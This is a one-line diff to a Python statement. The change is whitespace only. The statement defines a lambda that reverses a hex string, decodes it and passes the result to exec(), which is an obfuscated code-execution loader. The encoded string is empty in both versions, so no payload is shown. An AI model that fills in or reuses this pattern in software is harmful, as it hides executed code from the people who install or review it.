@@ -1,1 +1,1 @@
-_ = lambda __ : bytes.fromhex(__[::-1]);exec((_)(""))
+_ = lambda __ : bytes.fromhex(__[::-1]);exec((_)( "" ));
